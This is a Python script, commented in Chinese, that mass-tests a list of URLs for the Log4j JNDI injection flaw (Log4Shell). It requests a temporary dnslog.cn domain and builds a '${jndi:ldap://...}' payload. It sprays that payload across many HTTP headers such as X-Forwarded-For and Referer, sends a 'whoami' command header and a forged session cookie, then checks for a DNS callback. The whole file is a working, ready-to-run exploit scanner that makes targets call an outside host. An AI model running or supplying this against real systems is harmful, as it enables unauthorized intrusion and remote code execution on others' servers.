
import requests
import json
from concurrent.futures import thread
import time

#############################################################################
#随机字符串
word = 'abcnxmsdg12345iuolAFKIUYTB0QWERTHgfscvxmnvlkJKOP'
#dnslog获取临时域名
set_log = 'http://www.dnslog.cn/getdomain.php'
get_log = 'http://www.dnslog.cn/getrecords.php'
url_list = ['http://vulfocus.fofa.so:16797/hello','http://vulfocus.fofa.so:16797/hello','http://vulfocus.fofa.so:16797/hello','http://vulfocus.fofa.so:16797/hello']


###############################################################################

def set_code(word,length):
    import random
    code = ''
    for i in range(int(length)):
        num = random.randint(0,len(word)-1)
        code += word[num]
    return 'UM_distinctid=17db161bb4438d-041df5f6addccd-978153c-e1000-17db161bb45f7; CNZZDATA1278305074=1344306245-1639358062-null|1639358062; PHPSESSID={}' .format(code)

def set_dns_log(set_log,hearder):
    # print('获取临时域名...')
    #获取dnslog临时域名
    ret = requests.get(set_log,headers=hearder)
    dnslog = ret.text
    # print('获取域名...')
    # print('域名: {}'.format(dnslog))
    return dnslog







def attack(payload,url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko)',
        'Referer': payload,
        'CF-Connecting_IP': payload,
        'True-Client-IP': payload,
        'X-Host': payload,
        'X-Forwarded-For': payload,
        'Originating-IP': payload,
        'X-Real-IP': payload,
        'Proxy-Client-IP': payload,
        'X-Client-IP': payload,
        'Forwarded': payload,
        'Forwarded-For': payload,
        'Client-IP': payload,
        'Contact': payload,
        'X-Wap-Profile': payload,
        'Content-Type': 'application/x-www-form-urlencoded',
        'From': payload,
        'cmd': 'whoami'
    }
    ret = requests.post(url,headers=headers,params=payload)
    # print('注入返回:'.format(ret.text))
    # print(ret.text)
    return ret.text

def get_dns_log(get_log,hearder):
    #获取dnslog回调
    dns_ret = requests.get(get_log,headers=hearder)
    # print('获取dnslog结果')
    # print(dns_ret.text)
    return json.loads(dns_ret.text)


if __name__ == '__main__':
    with open('url.txt',mode='r',encoding='utf-8') as fr:
        for url in fr:
            payload = 'payload=${jndi:ldap://%s/a}'
            url = url.strip()
            #生成cookie
            code = set_code(word, 16)
            hearder = {
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/537.17 (KHTML, like Gecko)',
                'Cookie': code
            }
            #获取临时域名
            dnslog = set_dns_log(set_log,hearder)
            #组合临时域名字符串
            payload  = payload % dnslog
            #开始检测链接
            attack(payload, url)
            #获取结果
            result = get_dns_log(get_log, hearder)
            if len(result) > 0:
                print('发现漏洞!! ',url)
            time.sleep(5)



